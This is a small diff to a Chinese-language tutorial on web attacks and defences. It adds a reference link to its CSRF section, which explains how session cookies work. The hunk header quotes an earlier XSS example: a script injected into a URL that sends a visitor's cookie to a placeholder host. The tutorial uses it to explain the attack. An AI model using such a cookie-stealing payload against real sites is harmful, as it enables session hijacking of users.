@@ -53,6 +53,9 @@ http://www.amazon.cn/search?name=<script>document.location='http://xxx/get?cooki
 
 
 ## CSRF攻击和防御
+
+参考链接：[CSRF 详解与攻防实战](https://segmentfault.com/a/1190000006963312)
+
 CSRF是什么呢？CSRF全名是Cross-site request forgery，是一种对网站的恶意利用，CSRF比XSS更具危险性。想要深入理解CSRF的攻击特性我们有必要了解一下网站session的工作原理。 
 
 http请求是无状态的，也就是说每次http请求都是独立的无关之前的操作的，但是每次http请求都会将本域下的所有cookie作为http请求头的一部分发送给服务端，所以服务端就根据请求中的cookie存放的sessionid去session对象中找到该用户资料了。 
